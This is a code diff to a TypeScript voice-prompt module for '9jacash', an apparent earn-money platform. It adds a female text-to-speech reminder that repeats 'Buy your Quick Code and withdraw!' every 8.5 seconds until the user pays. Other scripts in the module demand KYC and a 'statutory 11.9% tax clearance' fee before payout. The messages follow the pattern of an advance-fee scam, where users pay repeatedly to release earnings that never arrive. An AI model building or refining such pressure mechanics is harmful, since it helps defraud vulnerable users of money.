@@ -361,6 +361,9 @@ export const voiceGuide = new VoiceGuideManager();
 export const NEW_USER_QUICKCODE_SPEECH_TEXT =
   "Congratulations and welcome to 9jacash! Your account is ready for instant withdrawal! Please click the Buy Quick Code button on your dashboard and buy a Quick Code so you can withdraw your money immediately. All you need in making a withdrawal is a Quick Code! You can also click the Earn button anytime to earn even more money on the platform. Happy earning!";
 
+export const BUY_QUICKCODE_REMINDER_SPEECH_TEXT =
+  "Buy your Quick Code and withdraw!";
+
 export const KYC_PENDING_SPEECH_TEXT =
   "Hello! You have a pending withdrawal waiting for payout. Please complete your KYC verification so your withdrawal can be credited directly to your bank account. Without completing your KYC verification, your first withdrawal cannot be delivered. Please complete your KYC now.";
 
@@ -368,6 +371,29 @@ export const TAX_CLEARANCE_SPEECH_TEXT =
   "Congratulations on completing your KYC verification! You are now 99% done with your first withdrawal. Please complete your statutory 11.9% tax clearance so your funds can be disbursed directly to your bank account.";
 
 let pendingSpeechCleanup: (() => void) | null = null;
+let repeatQuickCodeReminderTimer: ReturnType<typeof setTimeout> | null = null;
+const firstQuickCodeVoicePlayedMemory = new Set<string>();
+
+function hasFirstQuickCodeVoicePlayed(userId: string): boolean {
+  const key = userId || 'guest';
+  if (firstQuickCodeVoicePlayedMemory.has(key)) return true;
+  if (typeof window !== 'undefined') {
+    try {
+      return localStorage.getItem(`9jacash_first_qc_voice_done_${key}`) === 'true';
+    } catch {}
+  }
+  return false;
+}
+
+function markFirstQuickCodeVoicePlayed(userId: string): void {
+  const key = userId || 'guest';
+  firstQuickCodeVoicePlayedMemory.add(key);
+  if (typeof window !== 'undefined') {
+    try {
+      localStorage.setItem(`9jacash_first_qc_voice_done_${key}`, 'true');
+    } catch {}
+  }
+}
 
 /**
  * Finds the most natural, warm, and beautiful female English voice available on the device
@@ -391,7 +417,7 @@ function getPreferredFemaleVoice(): SpeechSynthesisVoice | null {
 
     // Explicitly avoid known male voice names
     if (
-      name.includes('male') && !name.includes('female') ||
+      (name.includes('male') && !name.includes('female')) ||
       name.includes('david') ||
       name.includes('mark') ||
       name.includes('daniel') ||
@@ -408,13 +434,25 @@ function getPreferredFemaleVoice(): SpeechSynthesisVoice | null {
     }
 
     // Premium / Neural / Natural female voices (highest priority)
-    if (name.includes('aria') || name.includes('jenny') || name.includes('sonia') || name.includes('libby') || name.includes('natasha') || name.includes('clara')) {
+    if (
+      name.includes('aria') ||
+      name.includes('jenny') ||
+      name.includes('sonia') ||
+      name.includes('libby') ||
+      name.includes('natasha') ||
+      name.includes('clara')
+    ) {
       score += 100;
     }
     if (name.includes('google uk english female') || name.includes('google us english')) {
       score += 95;
     }
-    if (name.includes('natural') || name.includes('neural') || name.includes('premium') || name.includes('enhanced')) {
+    if (
+      name.includes('natural') ||
+      name.includes('neural') ||
+      name.includes('premium') ||
+      name.includes('enhanced')
+    ) {
       score += 50;
     }
     if (
@@ -436,7 +474,12 @@ function getPreferredFemaleVoice(): SpeechSynthesisVoice | null {
     if (name.includes('female') || name.includes('woman') || name.includes('kore')) {
       score += 75;
     }
-    if (lang.includes('en-gb') || lang.includes('en-us') || lang.includes('en-ng') || lang.includes('en-au')) {
+    if (
+      lang.includes('en-gb') ||
+      lang.includes('en-us') ||
+      lang.includes('en-ng') ||
+      lang.includes('en-au')
+    ) {
       score += 15;
     }
 
@@ -456,7 +499,13 @@ function speakWithFemaleVoice(
   if (typeof window === 'undefined' || !('speechSynthesis' in window)) return false;
 
   try {
-    stopAllVoiceAdvice();
+    if (pendingSpeechCleanup) {
+      try {
+        pendingSpeechCleanup();
+      } catch {}
+      pendingSpeechCleanup = null;
+    }
+    window.speechSynthesis.cancel();
 
     let isCancelled = false;
     let hasStarted = false;
@@ -481,11 +530,11 @@ function speakWithFemaleVoice(
         };
 
         utterance.onend = () => {
-          if (options.onEnd) options.onEnd();
+          if (!isCancelled && options.onEnd) options.onEnd();
         };
 
         utterance.onerror = () => {
-          if (options.onEnd) options.onEnd();
+          if (!isCancelled && options.onEnd) options.onEnd();
         };
 
         window.speechSynthesis.speak(utterance);
@@ -544,23 +593,73 @@ function speakWithFemaleVoice(
 }
 
 /**
- * Plays a cheering, beautiful female voice welcoming a new user on their dashboard,
- * telling them to click Buy Quick Code to withdraw immediately (since all they need
- * to withdraw is a Quick Code), and that they can click Earn to earn more money.
+ * First plays the full cheering welcome message explaining how to buy a Quick Code and earn.
+ * After the first voice message has played, every subsequent message says:
+ * "Buy your Quick Code and withdraw!" until the user purchases their Quick Code.
  */
-export function speakNewUserQuickCodeAdvice(onStart?: () => void, onEnd?: () => void): boolean {
-  return speakWithFemaleVoice(NEW_USER_QUICKCODE_SPEECH_TEXT, {
+export function speakNewUserQuickCodeAdvice(
+  userId = 'guest',
+  onStart?: () => void,
+  onEnd?: () => void
+): boolean {
+  stopAllVoiceAdvice();
+
+  let sessionActive = true;
+
+  const scheduleNextShortReminder = () => {
+    if (!sessionActive) return;
+    if (repeatQuickCodeReminderTimer) clearTimeout(repeatQuickCodeReminderTimer);
+    repeatQuickCodeReminderTimer = setTimeout(() => {
+      if (!sessionActive) return;
+      speakWithFemaleVoice(BUY_QUICKCODE_REMINDER_SPEECH_TEXT, {
+        rate: 0.95,
+        pitch: 1.12,
+        onStart,
+        onEnd: () => {
+          if (onEnd) onEnd();
+          scheduleNextShortReminder();
+        },
+      });
+    }, 8500);
+  };
+
+  const alreadyPlayedFirst = hasFirstQuickCodeVoicePlayed(userId);
+  const textToSpeak = alreadyPlayedFirst
+    ? BUY_QUICKCODE_REMINDER_SPEECH_TEXT
+    : NEW_USER_QUICKCODE_SPEECH_TEXT;
+
+  const result = speakWithFemaleVoice(textToSpeak, {
     rate: 0.96,
     pitch: 1.12,
-    onStart,
-    onEnd,
+    onStart: () => {
+      markFirstQuickCodeVoicePlayed(userId);
+      if (onStart) onStart();
+    },
+    onEnd: () => {
+      markFirstQuickCodeVoicePlayed(userId);
+      if (onEnd) onEnd();
+      scheduleNextShortReminder();
+    },
   });
+
+  const prevCleanup = pendingSpeechCleanup;
+  pendingSpeechCleanup = () => {
+    sessionActive = false;
+    if (repeatQuickCodeReminderTimer) {
+      clearTimeout(repeatQuickCodeReminderTimer);
+      repeatQuickCodeReminderTimer = null;
+    }
+    if (prevCleanup) prevCleanup();
+  };
+
+  return result;
 }
 
 /**
  * Plays a clear female voice advising the user to complete KYC for their pending withdrawal
  */
 export function speakKycPendingAdvice(onStart?: () => void, onEnd?: () => void): boolean {
+  stopAllVoiceAdvice();
   return speakWithFemaleVoice(KYC_PENDING_SPEECH_TEXT, {
     rate: 0.94,
     pitch: 1.08,
@@ -573,6 +672,7 @@ export function speakKycPendingAdvice(onStart?: () => void, onEnd?: () => void):
  * Plays a clear female voice advising the user to complete statutory tax clearance (99% stage)
  */
 export function speakTaxClearanceAdvice(onStart?: () => void, onEnd?: () => void): boolean {
+  stopAllVoiceAdvice();
   return speakWithFemaleVoice(TAX_CLEARANCE_SPEECH_TEXT, {
     rate: 0.94,
     pitch: 1.08,
@@ -585,6 +685,10 @@ export function speakTaxClearanceAdvice(onStart?: () => void, onEnd?: () => void
  * Stops any active speech synthesis advice immediately
  */
 export function stopAllVoiceAdvice(): void {
+  if (repeatQuickCodeReminderTimer) {
+    clearTimeout(repeatQuickCodeReminderTimer);
+    repeatQuickCodeReminderTimer = null;
+  }
   if (pendingSpeechCleanup) {
     try {
       pendingSpeechCleanup();
